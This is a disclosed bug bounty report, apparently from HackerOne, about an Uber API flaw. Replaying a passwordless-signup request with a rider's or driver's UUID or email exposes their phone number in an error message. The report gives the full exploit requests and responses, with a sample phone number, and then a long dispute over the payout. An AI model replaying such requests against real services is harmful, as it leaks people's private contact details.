title: phone number exposure for riders/drivers given email/uuid
vulnerability_information:
Hi ,
## Summary
I have found one more vulnerable endpoint that is leaking user's phone number when i submit UUID in the request. This attack works for both Driver and Rider.

## Security Impact
We can get any Rider or Driver private phone number by knowing his UUID.

## Reproduction Steps
1 . Enter victim's UUID in loginId and replay the following request.

__Request:__
```
POST /rt/users/passwordless-signup HTTP/1.1
Content-Type: application/json; charset=UTF-8
Host: cn-dca1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/12.7.2
Content-Length: 663

{
    "commonData": {
        "appName": "client",
        "deviceIMEI": "541127718435990",
        "deviceId": "6f4b8fed46dce6b5cc77f67d19adc2f2",
        "deviceMobileCountryCode": "in",
        "deviceMobileDigits": "",
        "deviceModel": "HM NOTE 1LTE",
        "deviceOS": "4.4.4",
        "deviceSerialNumber": "2f1e6fa",
        "version": "3.134.5",
        "language": "en_US",
        "latitude": 0.0,
        "longitude": 0.0,
        "epoch": 1484671747392
    },
    "mobileCountryISO2": "IN",
    "loginId": "ee497b97-bc85-4687-b20b-ecf352a590c2",
    "state": "NOT_STARTED",
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

__Response:__

```
{
	"loginId": "",
	"serverState": "SIGN_IN",
	"tripVerifyStateData": {},
	"userMessage": null,
	"userRole": "client",
	"userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

2 . Now change state to __SIGN_IN__ in the request and replay .

__Request:__

```
POST /rt/users/passwordless-signup HTTP/1.1
Content-Type: application/json; charset=UTF-8
Host: cn-dca1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/12.7.2
Content-Length: 659

{
    "commonData": {
        "appName": "client",
        "deviceIMEI": "541127718435990",
        "deviceId": "6f4b8fed46dce6b5cc77f67d19adc2f2",
        "deviceMobileCountryCode": "in",
        "deviceMobileDigits": "",
        "deviceModel": "HM NOTE 1LTE",
        "deviceOS": "4.4.4",
        "deviceSerialNumber": "2f1e6fa",
        "version": "3.134.5",
        "language": "en_US",
        "latitude": 0.0,
        "longitude": 0.0,
        "epoch": 1484671747392
    },
    "mobileCountryISO2": "IN",
    "loginId": "ee497b97-bc85-4687-b20b-ecf352a590c2",
    "state": "SIGN_IN",
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

__Response:__

```
{
	"errorCode": "INVALID_REQUEST",
	"errorMessage": "Client should never call backend with this state.",
	"phoneNumberE164": "+919899665409",
	"serverState": "FAILED",
	"userMessage": "The client request has invalid parameters. Please update your app and retry.",
	"userWorkflow": "PASSWORDLESS_SIGNUP"
}
```

You will see Victim's private phone number in the response.

Thank you
vulnerability_information_html:
Hi ,

Summary

I have found one more vulnerable endpoint that is leaking user's phone number when i submit UUID in the request. This attack works for both Driver and Rider.

Security Impact

We can get any Rider or Driver private phone number by knowing his UUID.

Reproduction Steps

1 . Enter victim's UUID in loginId and replay the following request.

Request:

POST /rt/users/passwordless-signup HTTP/1.1
Content-Type: application/json; charset=UTF-8
Host: cn-dca1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/12.7.2
Content-Length: 663

{
    "commonData": {
        "appName": "client",
        "deviceIMEI": "541127718435990",
        "deviceId": "6f4b8fed46dce6b5cc77f67d19adc2f2",
        "deviceMobileCountryCode": "in",
        "deviceMobileDigits": "",
        "deviceModel": "HM NOTE 1LTE",
        "deviceOS": "4.4.4",
        "deviceSerialNumber": "2f1e6fa",
        "version": "3.134.5",
        "language": "en_US",
        "latitude": 0.0,
        "longitude": 0.0,
        "epoch": 1484671747392
    },
    "mobileCountryISO2": "IN",
    "loginId": "ee497b97-bc85-4687-b20b-ecf352a590c2",
    "state": "NOT_STARTED",
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}

Response:

{
    "loginId": "",
    "serverState": "SIGN_IN",
    "tripVerifyStateData": {},
    "userMessage": null,
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}

2 . Now change state to SIGN_IN in the request and replay .

Request:

POST /rt/users/passwordless-signup HTTP/1.1
Content-Type: application/json; charset=UTF-8
Host: cn-dca1.uber.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/12.7.2
Content-Length: 659

{
    "commonData": {
        "appName": "client",
        "deviceIMEI": "541127718435990",
        "deviceId": "6f4b8fed46dce6b5cc77f67d19adc2f2",
        "deviceMobileCountryCode": "in",
        "deviceMobileDigits": "",
        "deviceModel": "HM NOTE 1LTE",
        "deviceOS": "4.4.4",
        "deviceSerialNumber": "2f1e6fa",
        "version": "3.134.5",
        "language": "en_US",
        "latitude": 0.0,
        "longitude": 0.0,
        "epoch": 1484671747392
    },
    "mobileCountryISO2": "IN",
    "loginId": "ee497b97-bc85-4687-b20b-ecf352a590c2",
    "state": "SIGN_IN",
    "userRole": "client",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}

Response:

{
    "errorCode": "INVALID_REQUEST",
    "errorMessage": "Client should never call backend with this state.",
    "phoneNumberE164": "+919899665409",
    "serverState": "FAILED",
    "userMessage": "The client request has invalid parameters. Please update your app and retry.",
    "userWorkflow": "PASSWORDLESS_SIGNUP"
}

You will see Victim's private phone number in the response.

Thank you

weakness.name: Information Exposure Through an Error Message

activities.message:
@vijay_kumar,

Awesome, thanks for the report -- we're taking a look now and will update when we have more details.

Thanks,
Rob
activities.markdown_message:
@vijay_kumar,

Awesome, thanks for the report -- we're taking a look now and will update when we have more details.

Thanks,
Rob

activities.message: Thank you for your report! We have triaged to the relevant team so they can investigate. We will keep you updated.
activities.markdown_message: Thank you for your report! We have triaged to the relevant team so they can investigate. We will keep you updated.

activities.message:
Hi @vijay_kumar,

We have a couple of exciting updates to our bug bounty program that we'd like to share with you! We have raised our minimum bounty to $500, and will be awarding the minimum bounty to eligible reports at the time of triage moving forward.

We appreciate your continued patience as we thoroughly investigate complex issues and identify long-term, sustainable fixes. This new process enables us to recognize your efforts while we work to investigate the full impact of an issue. You can read more about the improvements to our program here: [https://medium.com/uber-security-privacy/uber-security-bug-bounty-updates-b8256494fd04]

We will award the rest of the bounty (if eligible) once this report is resolved.

activities.message:
Hi @vijay_kumar, we believe this issue has been fixed so we are closing this report as `Resolved`. Please take a moment to confirm and let us know if you do not agree.

We have meetings every few weeks to discuss `Resolved` reports and we will follow up after the next one to determine if this submission was eligible under our bug bounty program.

Thank you!
activities.markdown_message:

Yes it's fixed , Now i get `{"message":"Internal Server Error"}` error message when i hit this endpoint.

activities.message: Thanks for the great report, @vijay_kumar! This issue was mitigated by needing to know the UUID of a victim, but we appreciate you bringing it to our attention nonetheless. We look forward to your next submission!
activities.markdown_message: Thanks for the great report, @vijay_kumar! This issue was mitigated by needing to know the UUID of a victim, but we appreciate you bringing it to our attention nonetheless. We look forward to your next submission!

activities.message:
@fletcher It also works with email in the `loginId` , as I mentioned in the comment .

If you can't pay , please don't​ do misleading promises. In the last comment of report #173064 your team member mentioned that you will pay 5k for uuid/email->phone number lookup.

>>The $5000 dollar maximum payout for this category is based on a universal user UUID / email -> phone number lookup vulnerability


Your policy also states that phone number exposure is significant issue.

>>Significant Issues ($5,000) - Stored Cross-site Scripting which can cause significant brand damage (e.g. in a homepage), missing authorization checks leading to the exposure of email addresses, date of birth, names, phone numbers, etc.

Weird part is that you paid 2k for email->phone number lookup ( #195224 ) in which we need to brute force 6 digit of phone number whereas this report do not require any brute force and we can get victim's phone by email/uuid only get 1.5k.

I will not spend more time on this program because of less transparency and uncleared payout rules.
activities.markdown_message:
@fletcher It also works with email in the loginId , as I mentioned in the comment .

If you can't pay , please don't​ do misleading promises. In the last comment of report #173064 your team member mentioned that you will pay 5k for uuid/email->phone number lookup.

The $5000 dollar maximum payout for this category is based on a universal user UUID / email -> phone number lookup vulnerability

Your policy also states that phone number exposure is significant issue.

Significant Issues ($5,000) - Stored Cross-site Scripting which can cause significant brand damage (e.g. in a homepage), missing authorization checks leading to the exposure of email addresses, date of birth, names, phone numbers, etc.

Weird part is that you paid 2k for email->phone number lookup ( #195224 ) in which we need to brute force 6 digit of phone number whereas this report do not require any brute force and we can get victim's phone by email/uuid only get 1.5k.

I will not spend more time on this program because of less transparency and uncleared payout rules.

activities.message:
There is a lot to unpack in this comment, so I'm going to do it in a follow-up comment, but the biggest takeaway is that you should assume best intent (as we do with our researchers) in these situations.

We are not misleading you or attempting to cheat you -- our assumption was you needed a UUID (as we definitively stated in our comment when we awarded bounty) and when we were reviewing this report as a team (along with several other reports) we happened to miss your follow-up comment that mentioned using email in `loginId`.

Furthermore, you made a follow-up comment (on an already triaged report) stating that it was possible to use with email, but you provided no evidence or PoC to support that claim. That being said, we are assuming best intent here, and will choose to believe you that it was possible.

> I will not spend more time on this program because of less transparency and uncleared payout rules.

While not the outcome we would've hoped for, this might be a good idea as our philosophies around how to interact on bug bounty are at odds. We pride ourselves in honest, open and respectful interactions with researchers -- more than once you have violated this primitive.

> @fletcher Requesting full disclosure.

After addressing the other details in your comment and determining if we need to award more of a bounty, I'm happy to do full disclosure.
activities.markdown_message:
There is a lot to unpack in this comment, so I'm going to do it in a follow-up comment, but the biggest takeaway is that you should assume best intent (as we do with our researchers) in these situations.

We are not misleading you or attempting to cheat you -- our assumption was you needed a UUID (as we definitively stated in our comment when we awarded bounty) and when we were reviewing this report as a team (along with several other reports) we happened to miss your follow-up comment that mentioned using email in loginId.

Furthermore, you made a follow-up comment (on an already triaged report) stating that it was possible to use with email, but you provided no evidence or PoC to support that claim. That being said, we are assuming best intent here, and will choose to believe you that it was possible.

I will not spend more time on this program because of less transparency and uncleared payout rules.

While not the outcome we would've hoped for, this might be a good idea as our philosophies around how to interact on bug bounty are at odds. We pride ourselves in honest, open and respectful interactions with researchers -- more than once you have violated this primitive.

@fletcher Requesting full disclosure.

After addressing the other details in your comment and determining if we need to award more of a bounty, I'm happy to do full disclosure.

activities.message:
> If you can't pay , please don't​ do misleading promises. In the last comment of report #173064 your team member mentioned that you will pay 5k for uuid/email->phone number lookup.

> > The $5000 dollar maximum payout for this category is based on a universal user UUID / email -> phone number lookup vulnerability

That is a 7 month old comment from an employee that is no longer with the company and no longer active in our bug bounty program. As with all things in life, as we learn more about our attack surface and adjust our understanding of security impact, bounties will change -- this type of iteration is called out right on our current scope page: *"We will adapt as the program continues."*

In fact, we have a treasuremap2.0 release that will be done in approximately a month -- this plans to explicitly address how our program has matured since it's inception.

> Your policy also states that phone number exposure is significant issue.

>> Significant Issues ($5,000) - Stored Cross-site Scripting which can cause significant brand damage (e.g. in a homepage), missing authorization checks leading to the exposure of email addresses, date of birth, names, phone numbers, etc.

Yes, it is in that category. It also states right above that: *"amounts listed here are the maximum"*. Those numbers are meant as maximums (as we have discussed in previous tickets) -- they are not the amount guaranteed for any given "significant" issue.

> Weird part is that you paid 2k for email->phone number lookup ( #195224 ) in which we need to brute force 6 digit of phone number whereas this report do not require any brute force and we can get victim's phone by email/uuid only get 1.5k.

Actually, #195224 is turning phone number into email, not the other way around -- this is inconsequential to the main discussion, but is a perfect example of the idea that mistakes happen and we should always assume best intent.

There is nothing weird about this -- we missed your after-triage-comment (with no supporting evidence) when we were having our bounty determination meeting. Now that you have brought that to our attention, I imagine this will be awarded the same amount as #195224 since it has similar properties.

The reason this original got awarded less than #195224 is because our assumption that a UUID was required, which is obviously harder to guess than brute forcing 6 digits of a phone number.
activities.markdown_message:

The $5000 dollar maximum payout for this category is based on a universal user UUID / email -> phone number lookup vulnerability

That is a 7 month old comment from an employee that is no longer with the company and no longer active in our bug bounty program. As with all things in life, as we learn more about our attack surface and adjust our understanding of security impact, bounties will change -- this type of iteration is called out right on our current scope page: "We will adapt as the program continues."

In fact, we have a treasuremap2.0 release that will be done in approximately a month -- this plans to explicitly address how our program has matured since it's inception.

Your policy also states that phone number exposure is significant issue.

Significant Issues ($5,000) - Stored Cross-site Scripting which can cause significant brand damage (e.g. in a homepage), missing authorization checks leading to the exposure of email addresses, date of birth, names, phone numbers, etc.

Yes, it is in that category. It also states right above that: "amounts listed here are the maximum". Those numbers are meant as maximums (as we have discussed in previous tickets) -- they are not the amount guaranteed for any given "significant" issue.

Weird part is that you paid 2k for email->phone number lookup ( #195224 ) in which we need to brute force 6 digit of phone number whereas this report do not require any brute force and we can get victim's phone by email/uuid only get 1.5k.

Actually, #195224 is turning phone number into email, not the other way around -- this is inconsequential to the main discussion, but is a perfect example of the idea that mistakes happen and we should always assume best intent.

There is nothing weird about this -- we missed your after-triage-comment (with no supporting evidence) when we were having our bounty determination meeting. Now that you have brought that to our attention, I imagine this will be awarded the same amount as #195224 since it has similar properties.

The reason this original got awarded less than #195224 is because our assumption that a UUID was required, which is obviously harder to guess than brute forcing 6 digits of a phone number.

activities.message:
Our initial assumption was that this required a UUID, but the researcher brought to our attention that you could use just an email (similar to a previous one of their reports).

We're upping the bounty to $2000 total to be inline with other reports that had similar attack scenarios and impact.
activities.markdown_message:
Our initial assumption was that this required a UUID, but the researcher brought to our attention that you could use just an email (similar to a previous one of their reports).

We're upping the bounty to $2000 total to be inline with other reports that had similar attack scenarios and impact.

additional_data.old_title: Get user's (Rider+Driver) Phone Number using UUID
additional_data.new_title: phone number exposure for riders/drivers given email/uuid

activities.message:
@fletcher 

>Furthermore, you made a follow-up comment (on an already triaged report) stating that it was possible to use with email, but you provided no evidence or PoC to support that claim. 

1. No more steps were needed to reproduce it with email , just need to replace uuid with email in the same request so i don't want to make report long by pasting same request/response again.
2. I did not hear back from team after the comment, like you usually respond when some problem encounter in reproduction of issue so i assume you have successfully reproduced it with email.

>That is a 7 month old comment from an employee that is no longer with the company and no longer active in our bug bounty program. As with all things in life, as we learn more about our attack surface and adjust our understanding of security impact, bounties will change -- this type of iteration is called out right on our current scope page: "We will adapt as the program continues."

Yes this is a 7 month old comment and I think program's payout are not affected when an employee leave the company . If in any case payouts are changed then it should be updated on program policy page but you have not made any changes in policy in last 7 month regarding payout of private information exposure vulnerability.

Based on previously disclosed report (eg. #127158 , #127087 , #127161 ) most researcher will assume that universal user UUIDs are not mitigating factor because these report get full payout but now you says that UUID is a mitigating factor and now payout for UUID->email/phone lookup vulnerability will be $1500 , so it will be good idea to disclose this report so other researcher know what should they expect for these type of issue.

>After addressing the other details in your comment and determining if we need to award more of a bounty, I'm happy to do full disclosure.

I hope this report will be public soon as you mentioned . Your policy claims that -
- Significant Issues ($5,000) - Stored Cross-site Scripting which can cause significant brand damage (e.g. in a homepage), missing authorization checks leading to the exposure of email addresses, date of birth, names, phone numbers, etc.

There are many researcher like me who are curious to know - For which type of information exposure vulnerability payout will be $5k ? If you can answer this question with an example that will be much appreciated.
activities.markdown_message:
@fletcher

Furthermore, you made a follow-up comment (on an already triaged report) stating that it was possible to use with email, but you provided no evidence or PoC to support that claim.

  1. No more steps were needed to reproduce it with email , just need to replace uuid with email in the same request so i don't want to make report long by pasting same request/response again.
  2. I did not hear back from team after the comment, like you usually respond when some problem encounter in reproduction of issue so i assume you have successfully reproduced it with email.

That is a 7 month old comment from an employee that is no longer with the company and no longer active in our bug bounty program. As with all things in life, as we learn more about our attack surface and adjust our understanding of security impact, bounties will change -- this type of iteration is called out right on our current scope page: "We will adapt as the program continues."

Yes this is a 7 month old comment and I think program's payout are not affected when an employee leave the company . If in any case payouts are changed then it should be updated on program policy page but you have not made any changes in policy in last 7 month regarding payout of private information exposure vulnerability.

Based on previously disclosed report (eg. #127158 , #127087 , #127161 ) most researcher will assume that universal user UUIDs are not mitigating factor because these report get full payout but now you says that UUID is a mitigating factor and now payout for UUID->email/phone lookup vulnerability will be $1500 , so it will be good idea to disclose this report so other researcher know what should they expect for these type of issue.

After addressing the other details in your comment and determining if we need to award more of a bounty, I'm happy to do full disclosure.

I hope this report will be public soon as you mentioned . Your policy claims that -

  • Significant Issues ($5,000) - Stored Cross-site Scripting which can cause significant brand damage (e.g. in a homepage), missing authorization checks leading to the exposure of email addresses, date of birth, names, phone numbers, etc.

There are many researcher like me who are curious to know - For which type of information exposure vulnerability payout will be $5k ? If you can answer this question with an example that will be much appreciated.

activities.message:
> For which type of information exposure vulnerability payout will be $5k ?

There is no specific type of vulnerability that would guarantee a $5K bounty since we evaluate each report based on severity & impact.
activities.markdown_message:
For which type of information exposure vulnerability payout will be $5k ?

There is no specific type of vulnerability that would guarantee a $5K bounty since we evaluate each report based on severity & impact.

summaries.content: Given a Rider or Driver's email address or UUID, an Attacker could find out their actual phone number.
summaries.content_html: Given a Rider or Driver's email address or UUID, an Attacker could find out their actual phone number.
